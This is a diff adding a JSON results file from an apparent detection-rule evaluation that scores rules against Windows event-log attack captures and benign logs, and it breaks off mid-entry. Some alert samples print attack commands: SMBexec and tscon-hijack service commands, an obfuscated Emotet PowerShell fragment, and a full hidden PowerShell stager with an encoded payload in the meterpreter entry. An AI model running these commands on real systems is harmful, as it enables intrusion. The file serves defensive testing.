@@ -1,0 +1,1755 @@
+{
+  "summary": {
+    "rules_loaded": 59,
+    "attack_captures": 60,
+    "any_alert": 54,
+    "correct_technique": 52,
+    "benign_files": 40,
+    "benign_events": 316874,
+    "false_positive_alerts": 5,
+    "false_positive_matched_events": 6,
+    "benign_files_with_alerts": 1,
+    "false_positives_by_rule": {
+      "Windows Event Log Cleared (System 104)": 5
+    },
+    "elapsed_s": 42.7
+  },
+  "attack": [
+    {
+      "name": "4799_remote_local_groups_enumeration.evtx",
+      "records": 5,
+      "events": 5,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Sensitive Local Group/Account Enumeration via net.exe",
+          "technique": "T1069.001",
+          "level": "low",
+          "occurrences": 1,
+          "sample": "{\"TargetUserName\": \"Administrators\", \"TargetDomainName\": \"Builtin\", \"TargetSid\": \"S-1-5-32-544\", \"SubjectUserSid\": \"S-1-5-21-308926384-506822093-3341789130-1105"
+        }
+      ],
+      "expected": [
+        "T1069.001",
+        "T1087.001"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "CA_DCSync_4662.evtx",
+      "records": 3,
+      "events": 3,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "DCSync -- Directory Replication Rights Abused",
+          "technique": "T1003.006",
+          "level": "critical",
+          "occurrences": 3,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-738609754-2819869699-4189121830-500\", \"SubjectUserName\": \"Administrator\", \"SubjectDomainName\": \"insecurebank\", \"SubjectLogonId\": \"0"
+        }
+      ],
+      "expected": [
+        "T1003.006"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "CA_hashdump_4663_4656_lsass_access.evtx",
+      "records": 2,
+      "events": 2,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "LSASS Process Handle with Memory Read Access (Security Audit)",
+          "technique": "T1003.001",
+          "level": "critical",
+          "occurrences": 2,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-3461203602-4096304019-2269080069-1000\", \"SubjectUserName\": \"IEUser\", \"SubjectDomainName\": \"MSEDGEWIN10\", \"SubjectLogonId\": \"0x00000"
+        }
+      ],
+      "expected": [
+        "T1003.001"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "DE_1102_security_log_cleared.evtx",
+      "records": 112,
+      "events": 112,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        }
+      ],
+      "expected": [
+        "T1685.005"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "DE_Fake_ComputerAccount_4720.evtx",
+      "records": 2,
+      "events": 2,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "User Account Created with a Computer-Style ($) Name",
+          "technique": "T1136.002",
+          "level": "medium",
+          "occurrences": 2,
+          "sample": "{\"TargetUserName\": \"$\", \"TargetDomainName\": \"3B\", \"TargetSid\": \"S-1-5-21-308926384-506822093-3341789130-107103\", \"SubjectUserSid\": \"S-1-5-18\", \"SubjectUserName\""
+        }
+      ],
+      "expected": [
+        "T1136.002",
+        "T1036"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "DE_ProcessHerpaderping_Sysmon_11_10_1_7.evtx",
+      "records": 4,
+      "events": 4,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Process Herpaderping (File Create -> Process Access -> Image Load Chain)",
+          "technique": "T1055",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "(sequence)"
+        }
+      ],
+      "expected": [
+        "T1055"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "DE_RDP_Tunnel_5156.evtx",
+      "records": 101,
+      "events": 101,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "RDP Logon via Loopback-Tunneled Connection",
+          "technique": "T1572",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-18\", \"SubjectUserName\": \"PC01$\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x00000000000003e7\", \"TargetUserSid\": \"S-1-5-21-15"
+        }
+      ],
+      "expected": [
+        "T1572"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "DE_RDP_Tunneling_4624.evtx",
+      "records": 18,
+      "events": 18,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "RDP Logon via Loopback-Tunneled Connection",
+          "technique": "T1572",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-18\", \"SubjectUserName\": \"PC02$\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x00000000000003e7\", \"TargetUserSid\": \"S-1-5-21-35"
+        }
+      ],
+      "expected": [
+        "T1572"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "DE_UAC_Disabled_Sysmon_12_13.evtx",
+      "records": 3,
+      "events": 3,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "User Account Control Disabled via Registry",
+          "technique": "T1548.002",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": \"technique_id=T1088,technique_name=Bypass User Account Control\", \"EventType\": \"SetValue\", \"UtcTime\": \"2019-05-16 14:17:15.758\", \"ProcessGuid\": \"{df"
+        }
+      ],
+      "expected": [
+        "T1548.002",
+        "T1685",
+        "T1112"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "de_unmanagedpowershell_psinject_sysmon_7_8_10.evtx",
+      "records": 84,
+      "events": 84,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Remote Thread Creation from Scripting Engine or Web Server Process",
+          "technique": "T1055",
+          "level": "high",
+          "occurrences": 82,
+          "sample": "{\"RuleName\": null, \"UtcTime\": \"2019-05-18 17:16:16.176\", \"SourceProcessGuid\": \"{365abb72-3d37-5ce0-0000-001013dc0b00}\", \"SourceProcessId\": \"2108\", \"SourceImage\""
+        },
+        {
+          "rule": "Unmanaged PowerShell (System.Management.Automation Loaded into a Non-PowerShell Process)",
+          "technique": "T1059.001",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": \"Defense Evasion - Unmanaged PowerShell Detected\", \"UtcTime\": \"2019-05-18 17:16:18.786\", \"ProcessGuid\": \"{365abb72-3d1b-5ce0-0000-0010c3840b00}\", \""
+        }
+      ],
+      "expected": [
+        "T1059.001",
+        "T1055"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "dicovery_4661_net_group_domain_admins_target.evtx",
+      "records": 63,
+      "events": 63,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "SAM Privileged Group Object Access",
+          "technique": "T1069.002",
+          "level": "low",
+          "occurrences": 2,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-1587066498-1489273250-1035260531-1106\", \"SubjectUserName\": \"user01\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x000000000"
+        }
+      ],
+      "expected": [
+        "T1069.002",
+        "T1087.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "discovery_bloodhound.evtx",
+      "records": 10,
+      "events": 10,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Remote SAM/LSA/Server Service Enumeration over IPC$ (BloodHound / net-style recon)",
+          "technique": "T1087",
+          "level": "low",
+          "occurrences": 1,
+          "sample": "(sequence)"
+        }
+      ],
+      "expected": [
+        "T1087",
+        "T1069",
+        "T1482",
+        "T1018",
+        "T1033"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "discovery_enum_shares_target_sysmon_3_18.evtx",
+      "records": 4,
+      "events": 4,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "SMB Share Enumeration Probe (Remote Connection + Server Service Pipe)",
+          "technique": "T1135",
+          "level": "low",
+          "occurrences": 1,
+          "sample": "(sequence)"
+        }
+      ],
+      "expected": [
+        "T1135"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "discovery_local_user_or_group_windows_security_4799_4798.evtx",
+      "records": 3,
+      "events": 3,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Sensitive Local Group/Account Enumeration via net.exe",
+          "technique": "T1069.001",
+          "level": "low",
+          "occurrences": 2,
+          "sample": "{\"TargetUserName\": \"Administrator\", \"TargetDomainName\": \"MSEDGEWIN10\", \"TargetSid\": \"S-1-5-21-3461203602-4096304019-2269080069-500\", \"SubjectUserSid\": \"S-1-5-21"
+        },
+        {
+          "rule": "Sensitive Local Group/Account Enumeration via net.exe",
+          "technique": "T1069.001",
+          "level": "low",
+          "occurrences": 1,
+          "sample": "{\"TargetUserName\": \"Administrators\", \"TargetDomainName\": \"Builtin\", \"TargetSid\": \"S-1-5-32-544\", \"SubjectUserSid\": \"S-1-5-21-3461203602-4096304019-2269080069-10"
+        }
+      ],
+      "expected": [
+        "T1069.001",
+        "T1087.001"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "discovery_meterpreter_ps_cmd_process_listing_sysmon_10.evtx",
+      "records": 52,
+      "events": 52,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Suspicious LSASS Process Memory Access",
+          "technique": "T1003.001",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": null, \"UtcTime\": \"2019-04-30 07:23:00.883\", \"SourceProcessGUID\": \"{365abb72-f7c9-5cc7-0000-0010bf010e00}\", \"SourceProcessId\": \"3772\", \"SourceThread"
+        },
+        {
+          "rule": "Process Discovery by Mass Process Access from a Non-System Binary",
+          "technique": "T1057",
+          "level": "low",
+          "occurrences": 1,
+          "sample": "(sequence)"
+        }
+      ],
+      "expected": [
+        "T1057"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "discovery_psloggedon.evtx",
+      "records": 4,
+      "events": 4,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Remote Registry Access over IPC$ (winreg)",
+          "technique": "T1012",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-1587066498-1489273250-1035260531-1106\", \"SubjectUserName\": \"user01\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x000000000"
+        }
+      ],
+      "expected": [
+        "T1033",
+        "T1012"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "discovery_UEFI_Settings_rweverything_sysmon_6.evtx",
+      "records": 1,
+      "events": 1,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Known-Abusable (LOLDriver) Kernel Driver Loaded",
+          "technique": "T1068",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": null, \"UtcTime\": \"2020-02-11 11:05:36.955\", \"ImageLoaded\": \"C:\\\\Windows\\\\System32\\\\drivers\\\\RwDrv.sys\", \"Hashes\": \"SHA1=66E95DAEE3D1244A029D7F3D919"
+        }
+      ],
+      "expected": [
+        "T1068",
+        "T1542",
+        "T1014",
+        "T1082"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "exec_emotet_ps_4104.evtx",
+      "records": 1,
+      "events": 1,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Suspicious PowerShell WebClient Instantiation",
+          "technique": "T1105",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"MessageNumber\": \"1\", \"MessageTotal\": \"1\", \"ScriptBlockText\": \"$Va5w3n8=(('Q'+'2h')+('w9p'+'1'));&('ne'+'w-'+'item') $eNV:teMP\\\\WOrd\\\\2019\\\\ -itemtype DIrectOr"
+        }
+      ],
+      "expected": [
+        "T1059.001",
+        "T1105"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "exec_sysmon_1_ftp.evtx",
+      "records": 4,
+      "events": 4,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Suspicious Child Process of ftp.exe",
+          "technique": "T1202",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "C:\\Windows\\system32\\cmd.exe /C c:\\Windows\\system32\\calc.exe"
+        }
+      ],
+      "expected": [
+        "T1202",
+        "T1059"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "exec_sysmon_1_lolbin_pcalua.evtx",
+      "records": 3,
+      "events": 3,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "LOLBin Execution via Program Compatibility Assistant (pcalua.exe)",
+          "technique": "T1218",
+          "level": "low",
+          "occurrences": 1,
+          "sample": "\"C:\\Windows\\System32\\pcalua.exe\"  -a c:\\Windows\\system32\\calc.exe"
+        }
+      ],
+      "expected": [
+        "T1218",
+        "T1202"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "Exec_sysmon_meterpreter_reversetcp_msipackage.evtx",
+      "records": 8,
+      "events": 8,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Shell Spawned by a Windows Installer Custom Action",
+          "technique": "T1218.007",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "cmd"
+        }
+      ],
+      "expected": [
+        "T1218.007",
+        "T1059"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "ID4688-4697 RDP hijack via service creation.evtx",
+      "records": 3,
+      "events": 3,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "RDP Session Hijacking via tscon (Security 4688)",
+          "technique": "T1563.002",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "sc.exe  create hijackservice binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#5\""
+        },
+        {
+          "rule": "Service Installed with a Shell or Script Command as Its Binary (Security 4697)",
+          "technique": "T1543.003",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-4230534742-2542757381-3142984815-1111\", \"SubjectUserName\": \"admmig\", \"SubjectDomainName\": \"OFFSEC\", \"SubjectLogonId\": \"0x0000000001"
+        }
+      ],
+      "expected": [
+        "T1563.002",
+        "T1543.003",
+        "T1569.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "ID4697-MSF payload deployed via service.evtx",
+      "records": 1,
+      "events": 1,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Service Installed with a Shell or Script Command as Its Binary (Security 4697)",
+          "technique": "T1543.003",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-4230534742-2542757381-3142984815-1111\", \"SubjectUserName\": \"admmig\", \"SubjectDomainName\": \"OFFSEC\", \"SubjectLogonId\": \"0x0000000001"
+        }
+      ],
+      "expected": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "ID4697-New service for Mimikatz.evtx",
+      "records": 2,
+      "events": 2,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Kernel-Mode Driver Installed as a Windows Service",
+          "technique": "T1543.003",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-4230534742-2542757381-3142984815-1111\", \"SubjectUserName\": \"admmig\", \"SubjectDomainName\": \"OFFSEC\", \"SubjectLogonId\": \"0x0000000000"
+        }
+      ],
+      "expected": [
+        "T1543.003",
+        "T1569.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "ID4728-4756-Member added to sensitive domain groups.evtx",
+      "records": 4,
+      "events": 4,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Sensitive Domain Group Membership Change",
+          "technique": "T1098.007",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"MemberName\": \"CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan\", \"MemberSid\": \"S-1-5-21-4230534742-2542757381-3142984815-1159\", \"TargetUserName\": \""
+        },
+        {
+          "rule": "Sensitive Domain Group Membership Change",
+          "technique": "T1098.007",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"MemberName\": \"CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan\", \"MemberSid\": \"S-1-5-21-4230534742-2542757381-3142984815-1159\", \"TargetUserName\": \""
+        },
+        {
+          "rule": "Sensitive Domain Group Membership Change",
+          "technique": "T1098.007",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"MemberName\": \"CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan\", \"MemberSid\": \"S-1-5-21-4230534742-2542757381-3142984815-1159\", \"TargetUserName\": \""
+        },
+        {
+          "rule": "Sensitive Domain Group Membership Change",
+          "technique": "T1098.007",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "{\"MemberName\": \"CN=honey-pot1,OU=Test-OU,OU=OFFSEC-COMPANY,DC=offsec,DC=lan\", \"MemberSid\": \"S-1-5-21-4230534742-2542757381-3142984815-1159\", \"TargetUserName\": \""
+        }
+      ],
+      "expected": [
+        "T1098"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "ID4728-Massive account group membership change.evtx",
+      "records": 11,
+      "events": 11,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "One Account Added Members to Many Security Groups in a Short Time",
+          "technique": "T1098",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "(sequence)"
+        }
+      ],
+      "expected": [
+        "T1098"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "ID4728-Member adding to a group by the same account.evtx",
+      "records": 1,
+      "events": 1,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Account Added Itself to a Security Group",
+          "technique": "T1098",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "(sequence)"
+        }
+      ],
+      "expected": [
+        "T1098"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "ID7045-4697-SMBexec service registration.evtx",
+      "records": 2,
+      "events": 2,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Service Installed with a Shell or Script Command as Its Binary (System 7045)",
+          "technique": "T1543.003",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"ServiceName\": \"BTOBTO\", \"ImagePath\": \"%COMSPEC% /Q /c echo cd  ^> \\\\\\\\127.0.0.1\\\\C$\\\\__output 2^>^&1 > %TEMP%\\\\execute.bat & %COMSPEC% /Q /c %TEMP%\\\\execute.b"
+        },
+        {
+          "rule": "Service Installed with a Shell or Script Command as Its Binary (Security 4697)",
+          "technique": "T1543.003",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-4230534742-2542757381-3142984815-1111\", \"SubjectUserName\": \"admmig\", \"SubjectDomainName\": \"OFFSEC\", \"SubjectLogonId\": \"0x00000002cf"
+        }
+      ],
+      "expected": [
+        "T1543.003",
+        "T1569.002",
+        "T1021.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "kerberos_pwd_spray_4771.evtx",
+      "records": 12,
+      "events": 12,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Kerberos Password Spray (Multiple Distinct Accounts from One Source)",
+          "technique": "T1110.003",
+          "level": "critical",
+          "occurrences": 1,
+          "sample": "(sequence)"
+        }
+      ],
+      "expected": [
+        "T1110.003"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "LM_4624_mimikatz_sekurlsa_pth_source_machine.evtx",
+      "records": 6,
+      "events": 6,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Pass-the-Hash Style Logon (Logon Type 9 via seclogo)",
+          "technique": "T1550.002",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-1587066498-1489273250-1035260531-1106\", \"SubjectUserName\": \"user01\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x000000000"
+        }
+      ],
+      "expected": [
+        "T1550.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "LM_5145_Remote_FileCopy.evtx",
+      "records": 869,
+      "events": 869,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Executable Payload Written to Admin Share (Remote File Copy)",
+          "technique": "T1570",
+          "level": "critical",
+          "occurrences": 4,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-1587066498-1489273250-1035260531-500\", \"SubjectUserName\": \"Administrator\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x000"
+        }
+      ],
+      "expected": [
+        "T1570",
+        "T1021.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "LM_PowershellRemoting_sysmon_1_wsmprovhost.evtx",
+      "records": 1,
+      "events": 1,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Process Spawned by WinRM/PSRemoting Host",
+          "technique": "T1021.006",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "\"C:\\Windows\\system32\\HOSTNAME.EXE\""
+        }
+      ],
+      "expected": [
+        "T1021.006"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "LM_ScheduledTask_ATSVC_target_host.evtx",
+      "records": 34,
+      "events": 34,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "Scheduled Task Created with Hidden Flag",
+          "technique": "T1053.005",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-1587066498-1489273250-1035260531-500\", \"SubjectUserName\": \"Administrator\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x000"
+        }
+      ],
+      "expected": [
+        "T1053.002",
+        "T1053.005"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "LM_sysmon_psexec_smb_meterpreter.evtx",
+      "records": 10,
+      "events": 10,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Service ImagePath Set to a Shell or Script Command (Registry)",
+          "technique": "T1543.003",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{\"RuleName\": null, \"EventType\": \"SetValue\", \"UtcTime\": \"2019-04-30 20:26:51.934\", \"ProcessGuid\": \"{365abb72-2586-5cc9-0000-0010dc530000}\", \"ProcessId\": \"460\", \""
+        },
+        {
+          "rule": "Shell Started Directly by the Service Control Manager",
+          "technique": "T1569.002",
+          "level": "medium",
+          "occurrences": 1,
+          "sample": "C:\\Windows\\system32\\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden -noni -c \"if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAIuvyFwCA7VW+2/aSBD+OZH6P1gVErZCMA60aSJVujVPE5xADITHodNir+0lay/Ya169/u83Btym1/SuPeksHruzM7Mz33w7azcJbUF5KM2DxU1J+vTm/KyLIxxIco6MClKOmsrZGQhz5Er6KMlTtFzWeIBpOLu9rSZRREJxnBebRKA4JsGcURLLivSn9OSTiFw+zBfEFtInKfdHscn4HLOT2q6KbZ9Ilyh00rUOt3EaSdFaMirk/O+/55XppTYr1lcJZrGct3axIEHRYSyvSJ+VdMP+bknkvEntiMfcFcUnGpavioMwxi65B29rYhLhcyfOK5ADfCIikiiUIJvU/Lgo52HYjbiNHCcicZwvSNPU8XQ2+02ennZ9TEJBA1I0QkEivrRItKY2iYstHDqMPBJ3BlaWiGjozRQF1Nb8mci5MGGsIP2KG/mebDLMftZIfmkEWl0RKYW0gn/P0uROwsjRLv9KmFBzBZ5j3QGyz2/O35y7GUVWdyP6kiEwOpsexgQCk7s8pge9j1KpIJmwCRY82sE0148Sosy+wCrl3Gbhx9ZapgqKfP+0BdF0yKkzA5NTHXMbkUp/zMYacWlIarsQB9TOCCe/Bi5xGTnkV8zU7iEkOX9aIE6NMOJhkQKW1vg7s3pAxRdbPaHMIRGyoUAxRAW1U74N5lgDOW+EJgkAn+McSJdzgeYk0z5Re5ftns5BKV9lOI4LUjeBc2YXJItgRpyChMKYnpZQIvhhmP8arpkwQW0ci8zdTDmieNqtysNYRIkNBYPM+9aS2BSzFIiC1KIO0XcW9bJd86/CUMWMAfvB0xrKAJI0fUukNIicNLumUrSIMIIlIwFoHA57g2EPjvaJ4QfWYI84+W+jyxh8pGuKQpb+i9igtBbjoiANaSSgY6SIpuz5L1u/6BQQRDUipwLI2ZmY6juRMjm3H6c8PKFxyD0SkHcj4oGOY/K+cuwJ8lv1gVYRPGMjZKatP1MNbahmmPAd0LLBa9fOXXvRUqPa1neRERtmq1vrtVqVddsaVoRVN8Rd1xBmfbRYWKj1OBiLiYFafVp6Hlf2yzbdWx3kjLfq+72+35T07X7hOe645rretWs9au8atPNU7emlK9yp1ZPOk77RS5W4TjetHh30ntsNMR8PGR64qjfSbjDddqLFUOPm3kCo6ZftfdsdNn3T2Y1blCzUUof2UA+hO/txMGh6S68ZI/VmuKoG3h1CRh8jA9WHu/Y7pvcGDR0N6noPP/Bu+aKmahNnVW9MRrgdMKfZUrXxCDkoUvuer10/+GGKE/b0lZ7qoM5k11BBp1tBrcoV3U9WvaaH6qAzDDjCDfo8uBiBz/s+2DwNNIcjERojVR16qodcyx9jpIO2vkINnVd3H7pmVx0Or3xt/qz5EDMZrT+YbXTRsLuqql4Ec/hVkW0ut+FI31yvvZbF7/AdHq4nZVXrb5ouWqGLC13T56JVL7fXsG9fvRl8fJtyB8iTc/f+5AUvftTATRzFPmbAF+jN2cls8Khx6rhdTlMLWT5ezs8kCgmDCw6uwIzliDFup83+0Jzhojm2//Q2GsCwfPXqSJG+KCpfr4FMdHs7gTDh3OzHxQ4JPeEXSttyqQRdvbStlCDJn0+sypc7GRwV0jvhgMvRLzv4VdKzlPMfh1Hlf4brdIZ9+HP+Da6vsn9Y/SkIS4Vjyt+JvxX8EqK/nvsTpgJULehDjBxvv9chOJHjxYvBoTRQfff0pK91D4m4vIcXhjfnfwFhhx3MPQoAAA==''))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);\""
+        }
+      ],
+      "expected": [
+        "T1569.002",
+        "T1021.002"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "LM_winrm_exec_sysmon_1_winrshost.evtx",
+      "records": 3,
+      "events": 3,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Process Spawned by WinRM/PSRemoting Host",
+          "technique": "T1021.006",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "C:\\Windows\\system32\\cmd.exe /C ipconfig"
+        }
+      ],
+      "expected": [
+        "T1021.006"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "LM_WMIC_4648_rpcss.evtx",
+      "records": 5,
+      "events": 5,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Security Audit Log Cleared",
+          "technique": "T1685.005",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "{}"
+        },
+        {
+          "rule": "WMIC Used with Explicit Credentials Against a Remote Host",
+          "technique": "T1047",
+          "level": "medium",
+          "occurrences": 2,
+          "sample": "{\"SubjectUserSid\": \"S-1-5-21-1587066498-1489273250-1035260531-1106\", \"SubjectUserName\": \"user01\", \"SubjectDomainName\": \"EXAMPLE\", \"SubjectLogonId\": \"0x000000000"
+        }
+      ],
+      "expected": [
+        "T1047"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "MSSQL_multiple_failed_logon_EventID_18456.evtx",
+      "records": 10,
+      "events": 10,
+      "skipped": 0,
+      "alerts": [
+        {
+          "rule": "Authentication Brute Force (Repeated Failed Logons from One Source)",
+          "technique": "T1110",
+          "level": "high",
+          "occurrences": 1,
+          "sample": "(sequence)"
+        }
+      ],
+      "expected": [
+        "T1110"
+      ],
+      "any_alert": true,
+      "correct": true
+    },
+    {
+      "name": "Network_Service_Guest_added_to_admins_4732.evtx",
